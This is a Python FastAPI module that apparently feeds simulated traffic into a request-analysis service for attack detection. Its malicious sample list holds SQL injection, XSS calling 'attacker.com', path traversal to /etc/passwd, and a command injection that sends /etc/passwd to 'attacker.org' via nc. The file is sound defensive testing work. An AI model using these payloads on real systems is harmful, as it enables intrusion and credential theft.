import asyncio
import random
from fastapi import APIRouter

from api.models.schemas import RequestData
from api.routes.analyze import analyze

router = APIRouter()

simulation_task = None
is_simulating = False

BENIGN_SAMPLES = [
    {"method": "GET", "path": "/app/search", "request_body": "query=wireless+headphones"},
    {"method": "GET", "path": "/app/search", "request_body": "query=probook+laptop"},
    {"method": "GET", "path": "/app/products", "request_body": "category=electronics&sort=price_asc"},
    {"method": "POST", "path": "/app/cart/add", "request_body": "item_id=102&qty=1"},
    {"method": "GET", "path": "/app/profile", "request_body": "user=john_doe"},
]

MALICIOUS_SAMPLES = [
    {"method": "POST", "path": "/app/search", "request_body": "query=admin' UNION SELECT 1, username, password FROM users--"},
    {"method": "POST", "path": "/app/comment", "request_body": "query=<script>fetch('http://attacker.com/steal')</script>"},
    {"method": "GET", "path": "/app/download", "request_body": "file=../../../../etc/passwd"},
    {"method": "POST", "path": "/app/system/ping", "request_body": "target=127.0.0.1; cat /etc/passwd | nc attacker.org 1337"},
]

async def run_simulation_loop():
    global is_simulating
    while is_simulating:
        try:
            await asyncio.sleep(random.uniform(0.4, 0.9))
            is_attack = random.random() < 0.20
            sample = random.choice(MALICIOUS_SAMPLES) if is_attack else random.choice(BENIGN_SAMPLES)

            req = RequestData(
                method=sample["method"],
                path=sample["path"],
                protocol="HTTP/1.1",
                request_body=sample["request_body"]
            )

            await analyze(req)
        except Exception:
            await asyncio.sleep(1)

@router.post("/simulate/start")
async def start_simulation():
    global simulation_task, is_simulating
    if not is_simulating:
        is_simulating = True
        simulation_task = asyncio.create_task(run_simulation_loop())
    return {"status": "active", "message": "Traffic simulator running."}

@router.post("/simulate/stop")
async def stop_simulation():
    global is_simulating, simulation_task
    is_simulating = False
    if simulation_task:
        simulation_task.cancel()
        simulation_task = None
    return {"status": "stopped", "message": "Traffic simulator stopped."}

@router.get("/simulate/status")
async def simulation_status():
    return {"is_simulating": is_simulating}
